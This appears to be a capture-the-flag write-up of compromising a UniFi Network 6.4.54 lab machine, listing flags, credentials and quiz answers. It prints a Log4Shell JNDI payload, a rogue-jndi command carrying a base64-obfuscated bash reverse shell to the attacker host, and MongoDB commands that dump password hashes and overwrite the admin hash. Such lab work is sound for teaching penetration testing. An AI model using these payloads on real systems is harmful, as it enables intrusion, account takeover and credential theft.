ip: 10.129.26.54

# Flag
- root: e50bc93c75b634e4b272d2f771c33681
- user: 6ced1a6a89e666c0620cdb10262ba127

# Services
- OpenSSH v8.2p1
	- Port 22
- ibm-db2-admin
	- Port 6789
- http-proxy
	- Port 8080
	- Forwards to Unifi Network. Reverse Proxy?
- Unifi Network v6.4.54
	- Port 8443
- ssl/unkown
	- Port 8843
	- Seems to be an ssl wrapper for the service running on port 8880
- cddbp
	- Port 8880
	- Seems to be the http version of the service running on port 8843

# Credentials
- root: NotACrackablePassword4U2022
- tyler (unifi): Tywarren1
- administrator (unifi): Tywarren1

# Questions
1 - Which are the first four open ports?
	- 22, 6789, 8080, 8443
2 - What is title of the software that is running running on port 8443?
	- Unifi Network
3 - What is the version of the software that is running?
	- 6.4.54
4 - What is the CVE for the identified vulnerability?
	- CVE-2021-44228
5 - What protocol does JNDI leverage in the injection?
	- LDAP
6 - What tool do we use to intercept the traffic, indicating the attack was successful?
	- tcpdump
7 - What port is the MongoDB service running on?
	- 27117
8 - What is the default database name for UniFi applications?
	- ace
9 - What is the function we use to enumerate users within the database in MongoDB?
	- db.admin.find()
10 - What is the function we use to update users within the database in MongoDB?
	- db.admin.update
11 - What is the password for the root user?
	- NotACrackablePassword4U2022

# Scans
- Ran a scan of the top 200 ports and found services running on ports 22, 8080, and 8443
- Ran a scan of the full port range and found an additional service running on port 6789, 8843, and 8880
- Ran a service scan on ports 22, 6789, 8080, 8443, 8843, and 8880

# Unifi Network
- Navigated to `https://10.129.26.54:8443` and found the service is the Unifi Network application
- Noted the application is running version 6.4.54
- Looking up the version of Unifi Network it seems to be vulnerable to CVE-2021-44228 based on [this](https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1)
- Doing some more research on the CVE it looks to be a log4j vulnerability which an LDAP server can be combined with JNDI (Java Naming and Directory Interface) to execute arbitrary code. [source](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228)
- Found a good PoC for Log4Shell. [source](https://github.com/kozmer/log4j-shell-poc)
- It was discoverd that the exploit only works if you send the payload through the `remember` parameter. [source](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)
- Without the PoC running, if I send a jndi request `${jndi:ldap://10.10.14.74:1389/a}` I can see that the server makes a callback to our machine even though we don't have an ldap server running
- The log4j-shell-poc did not seem to work so trying a differnt one instead. [source](https://github.com/veracode-research/rogue-jndi)
- Using rogue-jndi with `java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNzQvMTMzNyAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.129.28.107"` and sending `${jndi:ldap://10.10.14.74:1389/o=tomcat}` in the remember parameter we were able to get a reverse shell
- The reverse shell reports the user is unifi (id 999)
- Found the user flag `6ced1a6a89e666c0620cdb10262ba127` at "/home/michael"
- By looking at the beginning of `/usr/lib/unifi/logs/mongod.log` it was discovered mongodb is running on port 27117
- Connected to local mongodb with `mongo --prot 27117`
- Listed the databases with `show dbs` and determined `ace` was probably the main database since it had the largest filesize
```
show dbs
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB
```
- Found mongodb users and their password hashes with `db.admin.find()`
```
administrator: $6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.
michael: $6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0
Seamus: $6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.
warren: $6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.
james: $6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1
```
- Created a new password with `mkpasswd -m sha-512 Tywarren1`
- Updated adminstrator's password with `db.admin.update({"name": "administrator"}, {$set : {"x_shadow": "$6$/s/yBivRwcMXDX3Y$8D.T2p.c5pBU0ZFjI6pdstSjOkLqv.JJ89jzkVt8PgmfB8wzgz/U2JSRYNEY86.THZ9C6Vt/3CZaIrS38Mb1.1"}})`
- By resetting the password we can not login via the unifi web console
- Added a user `tyler` with the password `Tywarren1` in case another user changes the admin password
- Found the root password at `https://10.129.28.107:8443/manage/site/default/settings/site` under "Device Authentication". root password is `NotACrackablePassword4U2022`
- using ssh to login with these credentials we are presented with the root flag `e50bc93c75b634e4b272d2f771c33681`
